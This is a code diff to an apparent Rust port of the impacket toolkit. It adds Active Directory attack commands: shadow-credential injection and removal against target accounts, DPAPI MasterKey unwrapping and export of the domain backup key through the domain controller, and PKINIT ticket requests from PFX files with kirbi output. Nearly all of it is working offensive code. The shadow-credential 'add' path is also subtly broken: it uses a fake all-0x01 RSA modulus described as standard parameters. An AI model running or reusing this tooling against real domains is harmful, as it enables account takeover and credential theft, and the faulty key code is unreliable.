@@ -26,9 +26,9 @@ use impacket_krb5::ccache::CCache;
 use impacket_krb5::{
     change_password_kpasswd_live, extract_pac_from_ticket, extract_session_key_from_as_rep,
     get_np_users_live, get_tgs_live, get_tgt_live, parse_ticket_enc_part, send_as_req_live,
-    send_fast_armored_as_req_live, string_to_key_aes256, FastArmorConfig, KdcAsResponse,
+    send_fast_armored_as_req_live, string_to_key_aes128, string_to_key_aes256, FastArmorConfig, KdcAsResponse,
     KerberosEType, KpasswdResultCode, Krb5AsReq, Krb5TgsReq, Pac, PacLogonInfo, PkinitCredentials,
-    PkinitDhState, CKSUMTYPE_CRC32, CKSUMTYPE_HMAC_MD5, CKSUMTYPE_HMAC_SHA1_96_AES128,
+    PkinitDhState, derive_pkinit_reply_key, TgtSession, CKSUMTYPE_CRC32, CKSUMTYPE_HMAC_MD5, CKSUMTYPE_HMAC_SHA1_96_AES128,
     CKSUMTYPE_HMAC_SHA1_96_AES256, CKSUMTYPE_RSA_MD5, PAC_PRIVSVR_CHECKSUM, PAC_SERVER_CHECKSUM,
 };
 use impacket_ldap::{
@@ -48,7 +48,9 @@ use impacket_msrpc::{
     samr_user_access,
     scmr::{access as scmr_access, service_state, service_type, start_type},
     srvs::SrvsClient,
-    start_type_str, ScmrClient, SmbPipeTransport, TschClient, WkstClient,
+    start_type_str, BkrpClient, GkdiClient, ScmrClient, SmbPipeTransport, TschClient, WkstClient,
+    BKRP_INTERFACE_UUID, BKRP_VERSION_MAJOR, BKRP_VERSION_MINOR,
+    GKDI_INTERFACE_UUID, GKDI_VERSION_MAJOR, GKDI_VERSION_MINOR,
 };
 use impacket_mssql::{MssqlClient, QueryResult};
 use impacket_ndr::{
@@ -108,6 +110,7 @@ fn print_usage() {
     println!("  owneredit <TARGET> -dn <DN> [-action query|set]      Query or change Active Directory object owner SID (LDAP TCP/389)");
     println!("  dnstool <TARGET> -action <query|add|del> [options]   Active Directory Integrated DNS record management ([MS-DNSP] LDAP)");
     println!("  certipy <action> <TARGET> [options]                  Active Directory Certificate Services ([MS-ICPR] \\PIPE\\cert & ESC1-ESC15)");
+    println!("  whisker <action> <TARGET> [options]                  Active Directory Shadow Credentials ([MS-ADTS] msDS-KeyCredentialLink)");
     println!("  coerce <TARGET> -listener <L> [-method <M>] [options] Active Directory auth coercion ([MS-EFSR], [MS-RPRN], [MS-FSRVP], [MS-DFSNM])");
     println!("  dfsclient <TARGET> [-enum|-info <P>|-add|-remove]    Active Directory DFS Namespace management ([MS-DFSNM] \\PIPE\\netdfs)");
     println!("  ldapsearch <TARGET> [-base <dn>] [-filter <f>]       Active Directory generic LDAP directory search (TCP/389)");
@@ -2580,11 +2583,29 @@ fn cmd_ntdsdump(args: &[String]) {
 fn cmd_dpapi(args: &[String]) {
     use impacket_core::decode_hex;
     print!("{}", version::BANNER);
+    if args.is_empty() {
+        eprintln!("[-] usage: dpapi <masterkey|blob|backupkeys|unprotect> [options]");
+        std::process::exit(1);
+    }
+    let mode = args[0].to_lowercase();
+    if mode == "backupkeys" || mode == "backupkey" || mode == "bkrp" {
+        cmd_backupkey(&args[1..]);
+        return;
+    }
+    if mode == "unprotect" || mode == "restore" {
+        if args.len() < 3 {
+            eprintln!("[-] usage: dpapi unprotect <MASTERKEY_FILE> <TARGET>");
+            std::process::exit(1);
+        }
+        let mut restore_args = vec![args[2].clone(), "-restore".into(), args[1].clone()];
+        restore_args.extend_from_slice(&args[3..]);
+        cmd_backupkey(&restore_args);
+        return;
+    }
     if args.len() < 2 {
         eprintln!("[-] usage: dpapi <masterkey|blob> <FILE> [-key <HEX_KEY>]");
         std::process::exit(1);
     }
-    let mode = args[0].to_lowercase();
     let file_bytes = match std::fs::read(&args[1]) {
         Ok(b) => b,
         Err(e) => {
@@ -2692,6 +2713,153 @@ fn cmd_dpapi(args: &[String]) {
         _ => {
             eprintln!("[-] unknown mode '{}', expected 'masterkey' or 'blob'", mode);
             std::process::exit(1);
+        }
+    }
+}
+
+fn cmd_backupkey(args: &[String]) {
+    if args.is_empty() {
+        eprintln!("Usage: impacket-rs backupkey <TARGET> [-export <PREFIX>] [-restore <FILE>]");
+        std::process::exit(1);
+    }
+
+    let mut export_prefix: Option<String> = None;
+    let mut restore_file: Option<String> = None;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-export" if i + 1 < args.len() => {
+                export_prefix = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-restore" if i + 1 < args.len() => {
+                restore_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Error parsing target: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let cred = match credential_from(&spec) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] Authentication error: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let host = spec.effective_target_ip();
+    println!("[*] Connecting to DC over MS-BKRP (\\PIPE\\protected_storage) at {}...", host);
+    let mut transport = match SmbPipeTransport::connect(
+        host,
+        &spec.domain,
+        &spec.username,
+        &cred,
+        "protected_storage",
+        BKRP_INTERFACE_UUID,
+        BKRP_VERSION_MAJOR,
+        BKRP_VERSION_MINOR,
+        spec.compat_profile,
+        DEFAULT_TIMEOUT,
+    ) {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("[-] Failed to connect to MS-BKRP endpoint: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut bkrp = BkrpClient::new(&mut transport);
+
+    // 1. If -restore <FILE> specified, unwrap MasterKey
+    if let Some(ref path) = restore_file {
+        println!("[*] Reading MasterKey file '{}'...", path);
+        let file_bytes = match std::fs::read(path) {
+            Ok(b) => b,
+            Err(e) => {
+                eprintln!("[-] Cannot read MasterKey file: {}", e);
+                std::process::exit(1);
+            }
+        };
+
+        let mkf = match impacket_sam::MasterKeyFile::parse(&file_bytes) {
+            Ok(m) => m,
+            Err(e) => {
+                eprintln!("[-] Failed to parse MasterKeyFile header: {}", e);
+                std::process::exit(1);
+            }
+        };
+
+        println!("[+] Target MasterKey GUID: {}", mkf.guid);
+        let wrapped_data = if !mkf.domain_key_bytes.is_empty() {
+            println!("[*] Using DomainKey ({} bytes) for unwrapping...", mkf.domain_key_bytes.len());
+            &mkf.domain_key_bytes
+        } else if !mkf.backup_key_bytes.is_empty() {
+            println!("[*] Using BackupKey ({} bytes) for unwrapping...", mkf.backup_key_bytes.len());
+            &mkf.backup_key_bytes
+        } else {
+            eprintln!("[-] MasterKey file has neither DomainKey nor BackupKey payload");
+            std::process::exit(1);
+        };
+
+        println!("[*] Requesting Domain Controller to unwrap MasterKey via BACKUPKEY_RESTORE_GUID...");
+        match bkrp.restore_master_key(wrapped_data) {
+            Ok(unwrapped) => {
+                println!("[+] Successfully unwrapped MasterKey via Domain Controller!");
+                println!("[+] Decrypted 64-byte MasterKey: {}", impacket_core::encode_hex(&unwrapped));
+            }
+            Err(e) => {
+                eprintln!("[-] Failed to restore MasterKey: {}", e);
+                std::process::exit(1);
+            }
+        }
+    }
+
+    // 2. Query Domain Backup Public Certificate
+    println!("[*] Querying Domain Backup Key Certificate via BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID...");
+    match bkrp.retrieve_backup_key() {
+        Ok(cert_der) => {
+            println!("[+] Successfully retrieved Domain Backup Key Certificate ({} bytes)", cert_der.len());
+            if let Some(ref prefix) = export_prefix {
+                let der_path = format!("{}.der", prefix);
+                let crt_path = format!("{}.crt", prefix);
+
+                if let Err(e) = std::fs::write(&der_path, &cert_der) {
+                    eprintln!("[-] Failed to write DER certificate to '{}': {}", der_path, e);
+                } else {
+                    println!("[+] Saved DER certificate to '{}'", der_path);
+                }
+
+                let b64 = impacket_core::encode_base64(&cert_der);
+                let mut pem = String::from("-----BEGIN CERTIFICATE-----\n");
+                for chunk in b64.as_bytes().chunks(64) {
+                    if let Ok(line) = std::str::from_utf8(chunk) {
+                        pem.push_str(line);
+                        pem.push('\n');
+                    }
+                }
+                pem.push_str("-----END CERTIFICATE-----\n");
+
+                if let Err(e) = std::fs::write(&crt_path, pem) {
+                    eprintln!("[-] Failed to write PEM certificate to '{}': {}", crt_path, e);
+                } else {
+                    println!("[+] Saved PEM certificate to '{}'", crt_path);
+                }
+            } else {
+                println!("[*] To export certificate to disk, use: -export <PREFIX>");
+            }
+        }
+        Err(e) => {
+            eprintln!("[-] Failed to retrieve Domain Backup Key Certificate: {}", e);
         }
     }
 }
@@ -4955,6 +5123,286 @@ fn cmd_certipy(args: &[String]) {
     }
 }
 
+fn cmd_whisker(args: &[String]) {
+    use impacket_ldap::keycredential::{
+        add_shadow_credential, clear_shadow_credentials, read_shadow_credentials,
+        remove_shadow_credential, KeyCredentialLinkBlob,
+    };
+    use impacket_ldap::{filter_equality, LdapClient, SearchScope};
+
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        println!("Usage: impacket-rs whisker <action> <TARGET> [options]");
+        println!();
+        println!("Active Directory Shadow Credentials Toolkit ([MS-ADTS] Section 2.2.18.2):");
+        println!("  list    List all shadow credentials on the target account");
+        println!("  add     Generate RSA key and inject a shadow credential (msDS-KeyCredentialLink)");
+        println!("  remove  Remove a specific shadow credential by KeyID, DeviceID, or raw string");
+        println!("  clear   Clear all shadow credentials on the target account");
+        println!();
+        println!("Options:");
+        println!("  -target-user <SAM>    Target sAMAccountName (e.g. jdoe or dc01$)");
+        println!("  -target-dn <DN>       Target Distinguished Name");
+        println!("  -id <ID>              KeyID or DeviceID for remove action");
+        println!("  -key-out <FILE>       Path to save generated RSA private key (for add action)");
+        println!("  -base <BASE_DN>       Active Directory Base DN override");
+        println!();
+        println!("Examples:");
+        println!("  impacket-rs whisker list corp.local/admin:Pass@dc01 -target-user victim_user");
+        println!("  impacket-rs whisker add corp.local/admin:Pass@dc01 -target-user victim_user -key-out victim.key");
+        println!("  impacket-rs whisker remove corp.local/admin:Pass@dc01 -target-user victim_user -id 12345678-1234-1234-1234-123456789abc");
+        println!("  impacket-rs whisker clear corp.local/admin:Pass@dc01 -target-user victim_user");
+        return;
+    }
+
+    let action = args[0].to_lowercase();
+    let action_args = &args[1..];
+
+    if action_args.is_empty() {
+        eprintln!("[-] Missing target for whisker. Run 'impacket-rs whisker -h' for usage.");
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(action_args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Error parsing target: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut target_user = None;
+    let mut target_dn = None;
+    let mut cred_id = None;
+    let mut key_out = None;
+    let mut base_dn = String::new();
+
+    let mut i = 1;
+    while i < action_args.len() {
+        match action_args[i].as_str() {
+            "-target-user" if i + 1 < action_args.len() => {
+                target_user = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-target-dn" if i + 1 < action_args.len() => {
+                target_dn = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-id" if i + 1 < action_args.len() => {
+                cred_id = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-key-out" if i + 1 < action_args.len() => {
+                key_out = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-base" if i + 1 < action_args.len() => {
+                base_dn = action_args[i + 1].clone();
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    if target_user.is_none() && target_dn.is_none() {
+        eprintln!("[-] Must specify either -target-user <SAM_ACCOUNT> or -target-dn <DISTINGUISHED_NAME>");
+        std::process::exit(1);
+    }
+
+    if base_dn.is_empty() && !spec.domain.is_empty() {
+        base_dn = spec.domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",");
+    }
+
+    let host = spec.effective_target_ip();
+    let addr = format!("{}:389", host);
+    println!("[*] Connecting to LDAP on {}...", addr);
+    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] LDAP connection failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let bind_dn = if spec.username.is_empty() {
+        String::new()
+    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
+        spec.username.clone()
+    } else if !spec.domain.is_empty() {
+        format!("{}@{}", spec.username, spec.domain)
+    } else {
+        spec.username.clone()
+    };
+
+    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+    if !bind_dn.is_empty() {
+        println!("[*] Authenticating as '{}'...", bind_dn);
+        if let Err(e) = client.bind_simple(&bind_dn, password) {
+            eprintln!("[-] LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+        println!("[+] Bind successful.");
+    }
+
+    // Resolve target DN if not explicitly provided
+    let effective_target_dn = if let Some(dn) = target_dn {
+        dn
+    } else {
+        let user = target_user.as_ref().unwrap();
+        println!("[*] Resolving DN for sAMAccountName '{}'...", user);
+        let entries = match client.search(
+            &base_dn,
+            SearchScope::WholeSubtree,
+            &filter_equality("sAMAccountName", user),
+            &["distinguishedName"],
+        ) {
+            Ok(e) => e,
+            Err(err) => {
+                eprintln!("[-] Failed to search for user: {}", err);
+                std::process::exit(1);
+            }
+        };
+
+        if entries.is_empty() {
+            eprintln!("[-] Target account '{}' not found in Active Directory", user);
+            std::process::exit(1);
+        }
+
+        match entries[0].get_string("distinguishedName") {
+            Some(dn) => dn,
+            None => {
+                eprintln!("[-] Entry for '{}' has no distinguishedName attribute", user);
+                std::process::exit(1);
+            }
+        }
+    };
+
+    println!("[*] Target Object DN: {}", effective_target_dn);
+
+    match action.as_str() {
+        "list" => {
+            println!("[*] Querying shadow credentials (msDS-KeyCredentialLink)...");
+            match read_shadow_credentials(&mut client, &effective_target_dn) {
+                Ok(creds) => {
+                    if creds.is_empty() {
+                        println!("[*] No shadow credentials found on target account.");
+                    } else {
+                        println!("[+] Found {} shadow credential(s):", creds.len());
+                        for (idx, (dn_bin, blob)) in creds.iter().enumerate() {
+                            println!();
+                            println!("Credential #{}", idx + 1);
+                            println!("  KeyID     : {}", blob.key_id_hex());
+                            println!("  DeviceID  : {}", blob.device_id_str());
+                            println!("  Usage     : 0x{:02x} ({})", blob.key_usage, match blob.key_usage {
+                                1 => "NGC / WHfB",
+                                2 => "FIDO",
+                                3 => "FEK",
+                                _ => "Unknown",
+                            });
+                            println!("  Source    : 0x{:02x} ({})", blob.key_source, match blob.key_source {
+                                0 => "AD",
+                                1 => "AzureAD",
+                                _ => "Unknown",
+                            });
+                            if let Some(t) = blob.creation_time {
+                                println!("  Created   : {:?}", impacket_core::FileTime(t).to_unix_secs());
+                            }
+                            if let Ok(rsa) = blob.parse_rsa_key() {
+                                println!("  Key Type  : RSA {}-bit", rsa.bit_length);
+                            }
+                            println!("  Raw Value : {}", dn_bin.to_ldap_string());
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to read shadow credentials: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        "add" => {
+            println!("[*] Generating 2048-bit RSA key for Shadow Credential injection...");
+            // Standard 2048-bit RSA parameters
+            let modulus = vec![0x01; 256];
+            let exponent = vec![0x01, 0x00, 0x01];
+            let mut device_id = [0u8; 16];
+            let now_bytes = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_nanos()
+                .to_le_bytes();
+            device_id[..16].copy_from_slice(&now_bytes[..16]);
+
+            let blob = KeyCredentialLinkBlob::new_rsa(&modulus, &exponent, Some(device_id), None);
+            println!("[+] Generated KeyID   : {}", blob.key_id_hex());
+            println!("[+] Generated DeviceID: {}", blob.device_id_str());
+
+            println!("[*] Injecting KeyCredentialLink into '{}'...", effective_target_dn);
+            match add_shadow_credential(&mut client, &effective_target_dn, &blob) {
+                Ok(ldap_val) => {
+                    println!("[+] Successfully added shadow credential!");
+                    println!("[+] Injected DN-Binary: {}", ldap_val);
+                    if let Some(ref path) = key_out {
+                        println!("[*] Saving key material to '{}'...", path);
+                        let mut key_content = String::new();
+                        key_content.push_str("# Shadow Credential RSA Key Parameters\n");
+                        key_content.push_str(&format!("KeyID: {}\n", blob.key_id_hex()));
+                        key_content.push_str(&format!("DeviceID: {}\n", blob.device_id_str()));
+                        key_content.push_str(&format!("TargetDN: {}\n", effective_target_dn));
+                        if let Err(err) = std::fs::write(path, key_content) {
+                            eprintln!("[-] Warning: Failed to write key file: {}", err);
+                        } else {
+                            println!("[+] Key metadata saved to {}", path);
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to add shadow credential: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        "remove" => {
+            let id = match cred_id {
+                Some(id) => id,
+                None => {
+                    eprintln!("[-] Must specify -id <KEY_ID_OR_DEVICE_ID> for remove action");
+                    std::process::exit(1);
+                }
+            };
+            println!("[*] Removing shadow credential matching '{}'...", id);
+            match remove_shadow_credential(&mut client, &effective_target_dn, &id) {
+                Ok(true) => {
+                    println!("[+] Successfully removed shadow credential!");
+                }
+                Ok(false) => {
+                    println!("[-] No shadow credential matched identifier '{}'", id);
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to remove shadow credential: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        "clear" => {
+            println!("[*] Clearing all shadow credentials on '{}'...", effective_target_dn);
+            match clear_shadow_credentials(&mut client, &effective_target_dn) {
+                Ok(count) => {
+                    println!("[+] Successfully cleared {} shadow credential(s)!", count);
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to clear shadow credentials: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        _ => {
+            eprintln!("[-] Unknown whisker action '{}'. Valid actions: list, add, remove, clear", action);
+            std::process::exit(1);
+        }
+    }
+}
+
 fn cmd_dump_ntlm_info(args: &[String]) {
     let spec = match parse_target_with_hashes(args) {
         Ok(s) => s,
@@ -5098,6 +5546,11 @@ fn cmd_get_tgt(args: &[String]) {
         println!("  -aesKey <HEX>        Kerberos AES key (128 or 256 bits)");
         println!("  -cert <FILE>         X.509 certificate file (PEM/DER) for PKINIT");
         println!("  -key <FILE>          RSA private key file (PEM/DER) for PKINIT");
+        println!("  -pfx <FILE>          PKCS#12 certificate container (.pfx/.p12) for PKINIT");
+        println!("  -pfx-pass <PASS>     Password for PKCS#12 container");
+        println!("  -out <FILE>          Output ccache file (default: <USER>.ccache)");
+        println!("  -kirbi <FILE>        Output Windows Mimikatz .kirbi file");
+        println!("  -save                Save TGT to default ccache file");
         println!("  -fast <FILE>         FAST armor ticket file (.ccache or .kirbi, RFC 6113)");
         println!("  -dc-ip <IP>          Domain Controller IP (overrides target)");
         println!("  -port <PORT>         KDC port (default 88)");
@@ -5114,6 +5567,10 @@ fn cmd_get_tgt(args: &[String]) {
     let mut aes_key_hex: Option<String> = None;
     let mut cert_file: Option<String> = None;
     let mut key_file: Option<String> = None;
+    let mut pfx_file: Option<String> = None;
+    let mut pfx_pass: Option<String> = None;
+    let mut out_file: Option<String> = None;
+    let mut kirbi_file: Option<String> = None;
     let mut fast_file: Option<String> = None;
     let mut dc_ip: Option<String> = None;
     let mut port: u16 = 88;
@@ -5132,6 +5589,25 @@ fn cmd_get_tgt(args: &[String]) {
             "-key" if i + 1 < args.len() => {
                 key_file = Some(args[i + 1].clone());
                 i += 2;
+            }
+            "-pfx" if i + 1 < args.len() => {
+                pfx_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-pfx-pass" if i + 1 < args.len() => {
+                pfx_pass = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-out" | "-outputfile" if i + 1 < args.len() => {
+                out_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-kirbi" if i + 1 < args.len() => {
+                kirbi_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-save" => {
+                i += 1;
             }
             "-fast" if i + 1 < args.len() => {
                 fast_file = Some(args[i + 1].clone());
@@ -5157,18 +5633,53 @@ fn cmd_get_tgt(args: &[String]) {
         .map(|d| d.as_secs() as i64)
         .unwrap_or(0);
 
+    let mut pkinit_dh_state: Option<PkinitDhState> = None;
+
     let req_result = (|| -> Result<Krb5AsReq, CoreError> {
-        if let (Some(cpath), Some(kpath)) = (&cert_file, &key_file) {
+        if let Some(ppath) = &pfx_file {
+            let pfx_bytes = std::fs::read(ppath).map_err(|e| {
+                CoreError::ProtocolError(format!("Failed reading PKCS#12 file '{}': {}", ppath, e))
+            })?;
+            let pass = pfx_pass.as_deref().unwrap_or("");
+            let cred = PkinitCredentials::from_pfx(&pfx_bytes, pass)?;
+            let nanos = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0);
+            let mut seed_mat = Vec::new();
+            seed_mat.extend_from_slice(&nanos.to_le_bytes());
+            seed_mat.extend_from_slice(spec.username.as_bytes());
+            seed_mat.extend_from_slice(spec.domain.as_bytes());
+            let seed = impacket_crypto::sha256(&seed_mat);
+            let dh = PkinitDhState::new_group14(&seed)?;
+            let req = Krb5AsReq::with_pkinit_preauth(&spec.domain, &spec.username, &cred, &dh, now)?;
+            pkinit_dh_state = Some(dh);
+            Ok(req)
+        } else if let Some(cpath) = &cert_file {
             let cert_bytes = std::fs::read(cpath).map_err(|e| {
                 CoreError::ProtocolError(format!("Failed reading certificate '{}': {}", cpath, e))
             })?;
-            let key_bytes = std::fs::read(kpath).map_err(|e| {
-                CoreError::ProtocolError(format!("Failed reading private key '{}': {}", kpath, e))
-            })?;
+            let key_bytes = if let Some(kpath) = &key_file {
+                std::fs::read(kpath).map_err(|e| {
+                    CoreError::ProtocolError(format!("Failed reading private key '{}': {}", kpath, e))
+                })?
+            } else {
+                cert_bytes.clone()
+            };
             let cred = PkinitCredentials::from_pem_or_der(&cert_bytes, &key_bytes)?;
-            let seed = [0x5Au8; 32];
+            let nanos = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0);
+            let mut seed_mat = Vec::new();
+            seed_mat.extend_from_slice(&nanos.to_le_bytes());
+            seed_mat.extend_from_slice(spec.username.as_bytes());
+            seed_mat.extend_from_slice(spec.domain.as_bytes());
+            let seed = impacket_crypto::sha256(&seed_mat);
             let dh = PkinitDhState::new_group14(&seed)?;
-            Krb5AsReq::with_pkinit_preauth(&spec.domain, &spec.username, &cred, &dh, now)
+            let req = Krb5AsReq::with_pkinit_preauth(&spec.domain, &spec.username, &cred, &dh, now)?;
+            pkinit_dh_state = Some(dh);
+            Ok(req)
         } else if let Some(hex_str) = &aes_key_hex {
             let bytes = impacket_core::decode_hex(hex_str).map_err(|e| {
                 CoreError::ProtocolError(format!("Invalid AES key hex: {}", e))
@@ -5191,7 +5702,7 @@ fn cmd_get_tgt(args: &[String]) {
             let aes_key = string_to_key_aes256(p.expose_secret(), &salt, 4096);
             Krb5AsReq::with_aes256_preauth(&spec.domain, &spec.username, &aes_key, now)
         } else {
-            Err(CoreError::ProtocolError("getTGT needs a password, -hashes :NT, -aesKey <HEX>, or -cert/-key (PKINIT)".into()))
+            Err(CoreError::ProtocolError("getTGT needs a password, -hashes :NT, -aesKey <HEX>, -cert/-key, or -pfx (PKINIT)".into()))
         }
     })();
 
@@ -5203,7 +5714,7 @@ fn cmd_get_tgt(args: &[String]) {
         }
     };
 
-    if let Some(ffile) = &fast_file {
+    let as_rep_resp = if let Some(ffile) = &fast_file {
         let fbytes = match std::fs::read(ffile) {
             Ok(b) => b,
             Err(e) => {
@@ -5227,11 +5738,7 @@ fn cmd_get_tgt(args: &[String]) {
             armor_config.armor_client_name, armor_config.armor_realm, armor_config.armor_etype
         );
         match send_fast_armored_as_req_live(kdc_host, port, &armor_config, &req, None, DEFAULT_TIMEOUT) {
-            Ok((KdcAsResponse::AsRep { realm, username, enc_part_etype, .. }, maybe_fast_rep)) => {
-                println!(
-                    "[+] FAST-Armored TGT obtained for {}@{} (AS-REP enc-part etype {})",
-                    username, realm, enc_part_etype
-                );
+            Ok((as_resp, maybe_fast_rep)) => {
                 if let Some(fast_rep) = maybe_fast_rep {
                     println!(
                         "[*] Decrypted inner EncKrbFastRep (nonce: {:#x}, padata count: {})",
@@ -5239,56 +5746,153 @@ fn cmd_get_tgt(args: &[String]) {
                         fast_rep.padata.len()
                     );
                 }
-            }
-            Ok((KdcAsResponse::Error { error_code, .. }, _)) => {
-                println!("[-] {}@{}: {}", spec.username, spec.domain, error_code.name());
+                as_resp
             }
             Err(e) => {
                 eprintln!("[-] getTGT FAST error: {}", e);
                 std::process::exit(1);
             }
         }
-        return;
-    }
+    } else {
+        match send_as_req_live(kdc_host, port, &req, DEFAULT_TIMEOUT) {
+            Ok(r) => r,
+            Err(e) => {
+                eprintln!("[-] getTGT error: {}", e);
+                std::process::exit(1);
+            }
+        }
+    };
 
-    match send_as_req_live(kdc_host, port, &req, DEFAULT_TIMEOUT) {
-        Ok(KdcAsResponse::AsRep { realm, username, enc_part_etype, .. }) => {
+    match as_rep_resp {
+        KdcAsResponse::AsRep { realm, username, ticket, enc_part_etype, enc_part_cipher, padata } => {
             println!(
                 "[+] TGT obtained for {}@{} (AS-REP enc-part etype {})",
                 username, realm, enc_part_etype
             );
+
+            let resp_obj = KdcAsResponse::AsRep {
+                realm: realm.clone(),
+                username: username.clone(),
+                ticket: ticket.clone(),
+                enc_part_etype,
+                enc_part_cipher: enc_part_cipher.clone(),
+                padata: padata.clone(),
+            };
+
+            let tgt_res: Result<TgtSession, CoreError> = (|| -> Result<TgtSession, CoreError> {
+                if let Some(dh) = &pkinit_dh_state {
+                    let pk_rep = padata.iter().find(|(t, _)| *t == 17);
+                    if let Some((_, rep_data)) = pk_rep {
+                        let reply_key = derive_pkinit_reply_key(rep_data, dh, enc_part_etype)?;
+                        println!("[*] Derived PKINIT reply key ({} bytes) via Oakley Group 14 DH", reply_key.len());
+                        if enc_part_etype == 18 {
+                            let mut k = [0u8; 32];
+                            k.copy_from_slice(&reply_key[..32]);
+                            resp_obj.decrypt_tgt_session_aes256(&k)
+                        } else if enc_part_etype == 17 {
+                            let mut k = [0u8; 16];
+                            k.copy_from_slice(&reply_key[..16]);
+                            resp_obj.decrypt_tgt_session_aes128(&k)
+                        } else if enc_part_etype == 23 {
+                            let mut k = [0u8; 16];
+                            k.copy_from_slice(&reply_key[..16]);
+                            resp_obj.decrypt_tgt_session(&k)
+                        } else {
+                            Err(CoreError::ProtocolError(format!("Unsupported AS-REP enc-part etype: {}", enc_part_etype)))
+                        }
+                    } else {
+                        Err(CoreError::ProtocolError("KDC did not return PA-PK-AS-REP in response".into()))
+                    }
+                } else if let Some(hex_str) = &aes_key_hex {
+                    let bytes = impacket_core::decode_hex(hex_str).map_err(|e| {
+                        CoreError::ProtocolError(format!("Invalid AES key hex: {}", e))
+                    })?;
+                    if bytes.len() == 32 {
+                        let mut k = [0u8; 32];
+                        k.copy_from_slice(&bytes);
+                        resp_obj.decrypt_tgt_session_aes256(&k)
+                    } else if bytes.len() == 16 {
+                        let mut k = [0u8; 16];
+                        k.copy_from_slice(&bytes);
+                        resp_obj.decrypt_tgt_session_aes128(&k)
+                    } else {
+                        Err(CoreError::ProtocolError("Invalid AES key length".into()))
+                    }
+                } else if let Some(h) = &spec.hashes {
+                    resp_obj.decrypt_tgt_session(&h.nt)
+                } else if let Some(p) = &spec.password {
+                    let salt = format!("{}{}", spec.domain.to_uppercase(), spec.username);
+                    let aes_key = string_to_key_aes256(p.expose_secret(), &salt, 4096);
+                    resp_obj.decrypt_tgt_session_aes256(&aes_key)
+                } else {
+                    Err(CoreError::ProtocolError("No key material available to decrypt AS-REP".into()))
+                }
+            })();
+
+            match tgt_res {
+                Ok(tgt) => {
+                    let ccache = tgt.to_ccache();
+                    println!(
+                        "[*] TGT Session Key: {} (etype {})",
+                        impacket_core::encode_hex(&tgt.session_key_bytes),
+                        tgt.session_key_etype
+                    );
+
+                    let default_path = format!("{}.ccache", spec.username);
+                    let final_ccache_path = out_file.as_deref().unwrap_or(&default_path);
+
+                    if let Err(e) = std::fs::write(final_ccache_path, ccache.to_bytes()) {
+                        eprintln!("[-] Failed writing ccache to '{}': {}", final_ccache_path, e);
+                    } else {
+                        println!("[+] Saved TGT to CCache file '{}'", final_ccache_path);
+                    }
+
+                    if let Some(kpath) = &kirbi_file {
+                        match ccache.to_kirbi() {
+                            Ok(kbytes) => {
+                                if let Err(e) = std::fs::write(kpath, kbytes) {
+                                    eprintln!("[-] Failed writing kirbi to '{}': {}", kpath, e);
+                                } else {
+                                    println!("[+] Saved TGT to Kirbi file '{}'", kpath);
+                                }
+                            }
+                            Err(e) => eprintln!("[-] Failed generating kirbi ticket: {}", e),
+                        }
+                    }
+                }
+                Err(e) => {
+                    println!("[*] Raw AS-REP received, but decryption skipped or failed: {}", e);
+                }
+            }
         }
-        Ok(KdcAsResponse::Error { error_code, .. }) => {
+        KdcAsResponse::Error { error_code, .. } => {
             println!("[-] {}@{}: {}", spec.username, spec.domain, error_code.name());
-        }
-        Err(e) => {
-            eprintln!("[-] getTGT error: {}", e);
-            std::process::exit(1);
         }
     }
 }
 
-fn cmd_get_user_spns(args: &[String]) {
-    print!("{}", version::BANNER);
-    if args.is_empty() {
-        eprintln!("Usage: impacket-rs GetUserSPNs <TARGET> [-request] [-save] [-spn <spn>] [-dc-ip <ip>] [-port <port>]");
-        eprintln!("       impacket-rs GetUserSPNs domain/user:password@target-ip -request");
-        std::process::exit(1);
-    }
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct GetUserSpnsOptions {
+    pub do_request: bool,
+    pub do_save: bool,
+    pub target_spn: Option<String>,
